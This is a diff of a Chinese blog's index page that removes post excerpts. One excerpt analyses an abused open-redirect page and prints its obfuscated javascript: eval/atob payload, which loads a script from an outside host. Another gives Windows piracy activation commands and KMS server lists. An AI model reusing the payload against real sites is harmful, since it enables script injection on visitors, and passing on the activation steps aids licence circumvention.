@@ -270,7 +270,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-11-09 14:34:23" itemprop="dateModified" datetime="2026-11-09T14:34:23+08:00">2026-11-09</time>
+      <time title="Modified: 2026-11-09 15:57:28" itemprop="dateModified" datetime="2026-11-09T15:57:28+08:00">2026-11-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -306,51 +306,13 @@
     
     
     
-    <div class="post-body" itemprop="articleBody">
-          <p><img src="/post/20190729-ru_you_le_xiang_bei_hei_tiao_zhuan_ye_mian_fen_xi/johnccc-SBPO8p4Uqdo-unsplash.jpg" alt="Home decor"></p>
-<h2 id="故事"><a href="#故事" class="headerlink" title="故事"></a>故事</h2><blockquote>
-<p>去年的时候博客针对第三方网址地址跳转做了一个html页面，来做跳转用！这样能一定程度减少博客的权重的流失！</p>
-<p>这个HTML跳转页面是纯JS实现的，页面上也没做安全判断！</p>
-<p>但是过了一段时间突然发现域名被微信封了，不在微信分享网页了~~~</p>
-<p>经过分享发现原来是有人恶意利用这个html跳转页面，跳转到菠菜网站！！</p>
-<p>博主发现后立即在这个页面中加了有效的判断，然后开始漫长的申请解封的道路！</p>
-</blockquote>
-<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">含有恶意欺诈网页:  https://51.ruyo.net/go/index.html?u=javascript:parent[String.fromCharCode(101;118;97;108)](parent[String.fromCharCode(97;116;111;98)](&quot;ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPS8vYy5icWFraS5jbi94cy5qcz48L3NjcmlwdD4iKQ==&quot;));//241137/241137.html#pt_1520302119694 </span><br></pre></td></tr></table></figure>
-
-<p>拆开得到javascript代码</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:parent[<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">101</span>;<span class="number">118</span>;<span class="number">97</span>;<span class="number">108</span>)](parent[<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span>;<span class="number">116</span>;<span class="number">111</span>;<span class="number">98</span>)](<span class="string">&quot;ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPS8vYy5icWFraS5jbi94cy5qcz48L3NjcmlwdD4iKQ==&quot;</span>));<span class="comment">//241137/241137.html#pt_1520302119694 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//parent() 方法返回被选元素的直接父元素。</span></span><br><span class="line"><span class="comment">//fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。</span></span><br><span class="line"><span class="comment">//这个几个Unicode 值分别等于</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>101 &#x3D; e</li>
-<li>118 &#x3D; v</li>
-<li>97 &#x3D; a</li>
-<li>108 &#x3D; l</li>
-<li>97 &#x3D; a</li>
-<li>116 &#x3D; t</li>
-<li>111 &#x3D; o</li>
-<li>98 &#x3D; b</li>
-</ul>
-<p>连起来,得到eval atob,猜测可能是js函数</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>()<span class="comment">// 函数计算 JavaScript 字符串，并把它作为脚本代码来执行。</span></span><br><span class="line"><span class="title function_">atob</span>() <span class="comment">//方法用于解码使用 base-64 编码的字符串。</span></span><br></pre></td></tr></table></figure>
-
-<p><code>ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPS8vYy5icWFraS5jbi94cy5qcz48L3NjcmlwdD4iKQ==</code></p>
-<p>解码得到</p>
-<p><code>document.write(&quot;&lt;script src=//c.bqaki.cn/xs.js&gt;&lt;/script&gt;&quot;)</code></p>
-<p>我访问这个链接的时候已经是找不到这个ip地址了*（网站挂了）<em>但是在网上找到了缓存，估计是有人也是遭遇同样的情况然后用*<em>urlscan.io</em></em> 扫描了一下</p>
-<p>大概信息是</p>
-<ul>
-<li>扫描时间：2018年1月4日</li>
-<li>服务器地址：天津 天津 , 中国</li>
-</ul>
-<p>完整的缓存js代码是</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/post/20190729-ru_you_le_xiang_bei_hei_tiao_zhuan_ye_mian_fen_xi/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+    <div class="post-body" itemprop="articleBody"><!--noindex-->
+          <div class="post-button">
+            <a class="btn" href="/post/20190729-ru_you_le_xiang_bei_hei_tiao_zhuan_ye_mian_fen_xi/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+        <!--/noindex-->
       
     </div>
 
@@ -412,7 +374,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-11-09 14:34:23" itemprop="dateModified" datetime="2026-11-09T14:34:23+08:00">2026-11-09</time>
+      <time title="Modified: 2026-11-09 15:57:28" itemprop="dateModified" datetime="2026-11-09T15:57:28+08:00">2026-11-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -448,46 +410,13 @@
     
     
     
-    <div class="post-body" itemprop="articleBody">
-          <p><img src="/post/20190729-WindowsOS_cong_xia_zai_dao_ji_huo_dao_ban/johny-vino-R54V69BN0MI-unsplash.jpg" alt="Getting ready"></p>
-<h2 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h2><p>​	这是2019、2、27写的文章，迟迟未发布，考虑很多，害怕收到律师函之类的东西，但这些提供服务的网站截至到发稿时都还好好的便将其放出来</p>
-<h2 id="盗版"><a href="#盗版" class="headerlink" title="盗版"></a>盗版</h2><p>​	盗版（又称“翻版”）指在未经版权所有人同意的情况下，对其作品、出版物进行复制、再分发的行为，以及以此行为制成的侵权产品。在很多国家和地区，这种行为被定义为侵犯知识产权的违法行为，甚至犯罪行为，会受到所在国的处罚。盗版出版物通常包括盗版书籍、盗版软件和盗版音像作品。</p>
-<h2 id="态度"><a href="#态度" class="headerlink" title="态度"></a>态度</h2><p>​	盗版就是偷</p>
-<h2 id="What-is-kms-activation"><a href="#What-is-kms-activation" class="headerlink" title="What is kms activation"></a>What is kms activation</h2><p>​	KMS，全称Key Management Service,是微软官方认可的一种系统激活方式，普遍适用于企业。</p>
-<h2 id="关我屁事"><a href="#关我屁事" class="headerlink" title="关我屁事"></a>关我屁事</h2><p>​	利用这个我们可以<del>开心的</del>激活电脑上的windows系统，支持windows7，windows8，windows10等等，还不要钱，免费！</p>
-<h2 id="系统下载"><a href="#系统下载" class="headerlink" title="系统下载"></a>系统下载</h2><p><img src="/post/20190729-WindowsOS_cong_xia_zai_dao_ji_huo_dao_ban/kmsVl.png" alt="支持kms的VL"></p>
-<ul>
-<li><a href="/go.html?u=http://msdn.itellyou.cn/">MSDN, 我告诉你</a></li>
-<li><a href="/go.html?u=http://emtrek.org/viewforum.php?f=264">lopatkin精简版</a></li>
-<li>推荐从上面两个地方下载你要的系统，或者是微软官网</li>
-</ul>
-<h2 id="激活Windows"><a href="#激活Windows" class="headerlink" title="激活Windows"></a>激活Windows</h2><ul>
-<li>以管理员身份打开命令提示符,然执行下列命令(以kms.03k.org为例)：</li>
-<li>也可以另存为bat批处理文件</li>
-</ul>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">::<span class="built_in">cd</span> /d <span class="string">&quot;%SystemRoot%\system32&quot;</span></span><br><span class="line">slmgr /skms kms.03k.org</span><br><span class="line">slmgr /ato</span><br><span class="line">slmgr /xpr</span><br></pre></td></tr></table></figure>
-
-<h2 id="KMS服务器"><a href="#KMS服务器" class="headerlink" title="KMS服务器"></a>KMS服务器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kms.cangshui.net</span><br><span class="line">kms.moeclub.org</span><br><span class="line">kms.03k.org</span><br><span class="line">kms.library.hk</span><br></pre></td></tr></table></figure>
-
-<h2 id="懒"><a href="#懒" class="headerlink" title="懒?"></a>懒?</h2><p>懒得一个个打<del>（复制粘贴）</del>为此网站的站长还热心的提供了一键脚本</p>
-<ul>
-<li><a href="/go.html?u=https://cangshui.net/-down/-mysh/kms/KMS-Cangshui.net.bat">沧水的一键脚本</a></li>
-<li><a href="/go.html?u=https://kms.library.hk/kms.zip">提供的一键脚本</a></li>
-</ul>
-<p>效果图</p>
-<p><img src="/post/20190729-WindowsOS_cong_xia_zai_dao_ji_huo_dao_ban/runKmsBat.gif" alt="沧水的一键脚本"></p>
-<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p><strong>任何非官方渠道激活的盗版系统均有一定的风险。</strong></p>
-<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p> 本文以一个学习的态度，揭露了windows盗版行业背后的阴暗一面。</p>
-<p>​	<strong>任何非官方渠道激活的盗版系统的行为都是可耻的作为一个祖国的花朵，国家的未来，社会的栋梁我们要坚决反对和制止有相关行为的人员。</strong></p>
-<h2 id="KMS-GVLK-列表"><a href="#KMS-GVLK-列表" class="headerlink" title="KMS GVLK 列表"></a>KMS GVLK 列表</h2>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/post/20190729-WindowsOS_cong_xia_zai_dao_ji_huo_dao_ban/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+    <div class="post-body" itemprop="articleBody"><!--noindex-->
+          <div class="post-button">
+            <a class="btn" href="/post/20190729-WindowsOS_cong_xia_zai_dao_ji_huo_dao_ban/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+        <!--/noindex-->
       
     </div>
 
@@ -549,7 +478,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-11-09 14:34:23" itemprop="dateModified" datetime="2026-11-09T14:34:23+08:00">2026-11-09</time>
+      <time title="Modified: 2026-11-09 15:57:28" itemprop="dateModified" datetime="2026-11-09T15:57:28+08:00">2026-11-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -585,44 +514,13 @@
     
     
     
-    <div class="post-body" itemprop="articleBody">
-          <p><img src="/post/20190729-CORS_on_Apache_php/jill-dimond-ebqjlVDPGIk-unsplash.jpg" alt="Leaves and dew"></p>
-<h2 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h2><p><img src="/post/20190729-CORS_on_Apache_php/xiao2019-07-29-19-46-50-247.jpg" alt="Access-Control-Allow-Origin"></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Access</span> to <span class="title class_">XMLHttpRequest</span> at <span class="string">&#x27;http://bookmarks.tiiao.cn/api/qrcode.php&#x27;</span> popup.<span class="property">js</span>:<span class="number">27</span> </span><br><span class="line"><span class="keyword">from</span> origin <span class="string">&#x27;chrome-extension://mfhbgdlbkinkfilcddigcdcidecnefbi&#x27;</span> has been blocked by <span class="variable constant_">CORS</span> <span class="attr">policy</span>: <span class="title class_">No</span> <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span> header is present on the requested resource.</span><br></pre></td></tr></table></figure>
-
-<h3 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h3><p>​	跨域请求</p>
-<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>php文件添加header，注意：添加后意味着全部站都可以跨域请求。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin:*&#x27;</span>);<span class="comment">#所有域名都可以</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin:https://nobige.cn&#x27;</span>);<span class="comment">#单个域名</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin:&#x27;</span>.[<span class="string">&#x27;https://nobige.cn&#x27;</span>,<span class="string">&#x27;https://www.nobige.cn&#x27;</span>]);<span class="comment">#多个域名</span></span><br></pre></td></tr></table></figure>
-
-<p>或者<code>.htaccess</code>文件添加</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Header set Access-Control-Allow-Origin &quot;*&quot;#所有域名都可以</span><br><span class="line"></span><br><span class="line">Header set Access-Control-Allow-Origin &quot;https://nobige.cn&quot;;#单个域名</span><br></pre></td></tr></table></figure>
-
-<p><strong>注意：.htaccess不支持多个域名，要么单个域名，要么全部域名</strong></p>
-<p><strong>注意：.htaccess不支持多个域名，要么单个域名，要么全部域名</strong></p>
-<p><strong>注意：.htaccess不支持多个域名，要么单个域名，要么全部域名</strong></p>
-<p>同理在<code>httpd.conf</code>添加对于的代码也是可行的</p>
-<p>在 <code>&lt;Directory&gt;</code>, <code>&lt;Location&gt;</code>, <code>&lt;Files&gt;</code> 或者 <code>&lt;VirtualHost&gt;</code>字段内添加</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Header set Access-Control-Allow-Origin &quot;*&quot;#所有域名都可以</span><br><span class="line"></span><br><span class="line">Header set Access-Control-Allow-Origin &quot;https://nobige.cn&quot;;#单个域名</span><br></pre></td></tr></table></figure>
-
-<p>和.htaccess一样，不支持多个域名，要么单个域名，要么全部域名</p>
-<p><strong>注意：如果在php中添加，<code>.htaccess</code>文件或者<code>httpd.conf</code>文件中不能有相同功能的代码，否者会冲突</strong></p>
-<p><img src="/post/20190729-CORS_on_Apache_php/xiao2019-07-29-20-05-30-959.jpg" alt="Access-Control-Allow-Origin"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access to XMLHttpRequest at &#x27;http://bookmarks.tiiao.cn/api/import.php&#x27; from origin &#x27;chrome-extension://mfhbgdlbkinkfilcddigcdcidecnefbi&#x27; has been blocked by CORS policy: Response to preflight request doesn&#x27;t pass access control check: The &#x27;Access-Control-Allow-Origin&#x27; header contains multiple values &#x27;*, *&#x27;, but only one is allowed.</span><br></pre></td></tr></table></figure>
-
-<h2 id="其他错误"><a href="#其他错误" class="headerlink" title="其他错误"></a>其他错误</h2><p><img src="/post/20190729-CORS_on_Apache_php/xiao2019-07-29-20-08-40-79.jpg" alt="Access-Control-Allow-Headers"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access to XMLHttpRequest at &#x27;http://bookmarks.tiiao.cn/api/import.php&#x27; from origin &#x27;chrome-extension://mfhbgdlbkinkfilcddigcdcidecnefbi&#x27; has been blocked by CORS policy: Request header field authorization is not allowed by Access-Control-Allow-Headers in preflight response.</span><br></pre></td></tr></table></figure>
-
-<p>也可以添加对于<strong>header</strong>头</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Headers:*&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="/go.html?u=https://enable-cors.org/server_apache.html">enable cross-origin resource sharing</a></li>
-<li><a href="/go.html?u=https://www.runoob.com/w3cnote/php-ajax-cross-border.html">PHP Ajax 跨域问题最佳解决方案 | 菜鸟教程</a></li>
-<li><a href="/go.html?u=https://unsplash.com/photos/ebqjlVDPGIk">壁纸-Leaves and dew | HD photo by Jill Dimond (@jilldimond) on Unsplash</a></li>
-</ul>
-
+    <div class="post-body" itemprop="articleBody"><!--noindex-->
+          <div class="post-button">
+            <a class="btn" href="/post/20190729-CORS_on_Apache_php/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+        <!--/noindex-->
       
     </div>
 
@@ -684,7 +582,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-11-09 14:34:23" itemprop="dateModified" datetime="2026-11-09T14:34:23+08:00">2026-11-09</time>
+      <time title="Modified: 2026-11-09 15:57:28" itemprop="dateModified" datetime="2026-11-09T15:57:28+08:00">2026-11-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -720,21 +618,13 @@
     
     
     
-    <div class="post-body" itemprop="articleBody">
-          <p><img src="/post/20190726-php_wen_jian_shang_chuan_da_xiao_cuo_wu/525123.jpg" alt="鹿 非洲"></p>
-<h2 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h2><p>php上传图片过程中，出现如上错误。</p>
-<p><code>	Warning:  POST Content-Length of 10240000 bytes exceeds the limit of 5242880 bytes in Unknown on line 0</code></p>
-<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>1.修改php.ini文件，将post_max_size 改成你要的大小如100M?</p>
-<p><code>post_max_size = 5M</code>限制post请求body的大小</p>
-<p><code>upload_max_filesize = 10M</code>上传文件的最大允许大小。</p>
-<p>2.网页前端Js判断是否大于指定的值</p>
-<p>如果是生产环境则，修改php.ini文件，将display_errors 关闭，屏蔽错误显示或者启用错误日志。</p>
-<p><code>display_errors = Off</code></p>
-<h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><p>不知道为什么，如果不将display_errors  关闭，在php文件中添加以下代码始终无效</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭所有PHP错误报告</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>,<span class="string">&#x27;off&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p><a href="/go.html?u=https://www.ssyer.com/detail/525123">@小虫-鹿非洲-免费动物图_动物图库_动物素材下载,鬣狗,鸵鸟,免费,动物,图,图库,素材,下载-沙沙野</a></p>
-
+    <div class="post-body" itemprop="articleBody"><!--noindex-->
+          <div class="post-button">
+            <a class="btn" href="/post/20190726-php_wen_jian_shang_chuan_da_xiao_cuo_wu/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+        <!--/noindex-->
       
     </div>
 
@@ -796,7 +686,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-11-09 14:34:23" itemprop="dateModified" datetime="2026-11-09T14:34:23+08:00">2026-11-09</time>
+      <time title="Modified: 2026-11-09 15:57:28" itemprop="dateModified" datetime="2026-11-09T15:57:28+08:00">2026-11-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -832,53 +722,13 @@
     
     
     
-    <div class="post-body" itemprop="articleBody">
-          <p><img src="/post/20190719-mianfeitupianyasuoTinyPngkehuduan/5b98f9d3ed0cbe41f4a8ab3c.jpg" alt="美女海边"></p>
-<h2 id="借口"><a href="#借口" class="headerlink" title="借口"></a>借口</h2><p>​	在写文章的时候因为需要压缩图片，打开网页还要点击下载，很是麻烦，试过别的软件又不是很满意，要么软件过于庞大，50M起步，有的更是夸张，试过limitPNG2 发现只能支持png，PPDuck3收费，Light Image Resizer 5神奇算法还能给图片增量真是fo了，当然了也看了下官网推荐的windows软件都是过于庞大，于是便自己动手写了个软件。用的易语言，界面难看，核心是post。</p>
-<p>​	在写的过程中发现有人也写了一个类似的，但是我本地测试不能用，另一个则是直接调用网页，感觉太low了。</p>
-<h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><p><img src="/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-22-04-01-154.jpg" alt="TinyPng in Windows"></p>
-<h2 id="特色"><a href="#特色" class="headerlink" title="特色"></a>特色</h2><ul>
-<li>小</li>
-<li>免费</li>
-<li>支持批量</li>
-<li>无压缩上限</li>
-<li>CPU不狂涨</li>
-</ul>
-<h2 id="同行产品"><a href="#同行产品" class="headerlink" title="同行产品"></a>同行产品</h2><p>某个我觉的<del>比</del>（非）<del>较</del>（常）<del>差</del>（low）的截图</p>
-<p><img src="/post/20190719-mianfeitupianyasuoTinyPngkehuduan/171349mc81ob0dn9abs39n.png" alt="同行1"></p>
-<p>不能正常运行，但是可以借鉴的软件截图</p>
-<p><img src="/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-21-50-19-924.jpg" alt="同行1"></p>
-<p>limitPNG2 </p>
-<p><img src="/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-21-59-29-123.jpg" alt="limitPNG2 "></p>
-<p>PPDuck3</p>
-<p><img src="/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-21-59-50-524.jpg" alt="PPDuck3"></p>
-<p>Light Image Resizer 5</p>
-<p><img src="/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-22-00-05-332.jpg" alt="Light Image Resizer 5"></p>
-<p>bamboo</p>
-<p><img src="/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-21-58-01-822.jpg" alt="bamboo"></p>
-<p>tinyPNGApp</p>
-<p><img src="/post/20190719-mianfeitupianyasuoTinyPngkehuduan/xiao2019-07-19-21-58-25-443.jpg" alt="tinyPNGApp"></p>
-<h2 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h2><ul>
-<li><p>其中PPDuck3我觉得是体验最好的软件，不管是压缩速度还是界面美观都是很不错的，虽然整个软件有点大，150m左右。未找到</p>
-</li>
-<li><p>limitPNG2 则是只支持png，且速度实在是不敢恭维</p>
-</li>
-</ul>
-<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ul>
-<li><del><a href="#">TinyPng in Windows.rar (371.01 KB)</a></del></li>
-<li>其余下载地址请参考博客文章</li>
-<li><a href="/go.html?u=https://f.tiiao.cn/2019/07/31/TinyPng%20in%20Windows2.rar">TinyPng in Windows2.exe</a><ul>
-<li>更新：添加官网API，支持5M~25M图片</li>
-<li>EXE_MD5:39FEBEE57B845977A2602031C5A54A00</li>
-<li><a href="/go.html?u=https://habo.qq.com/file/showdetail?pk=ADcGZ11vB2IIPVs6U2E=">腾讯哈勃分析系统-已完成</a></li>
-<li><a href="/go.html?u=http://r.virscan.org/language/zh-cn/report/410764516cfebdbe13c60dc2b6863973">TinyPng in Windows2.exe MD5:39febee57b845977a2602031c5a54a00 22% 的杀软(11&#x2F;49) 报告发现病毒 - VirSCAN.org-多引擎在线病毒扫描网 v1.02，当前支持 47 款杀毒引擎</a></li>
-</ul>
-</li>
-</ul>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="/go.html?u=https://www.ssyer.com/detailpage/5b98f9d3ed0cbe41f4a8ab3c">美女海边图片 - @Artem Bali - 无版权图片_图片免费商用_免费图片_免费图库_设计素材_背景素材 - 沙沙野</a></li>
-</ul>
-
+    <div class="post-body" itemprop="articleBody"><!--noindex-->
+          <div class="post-button">
+            <a class="btn" href="/post/20190719-mianfeitupianyasuoTinyPngkehuduan/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+        <!--/noindex-->
       
     </div>
 
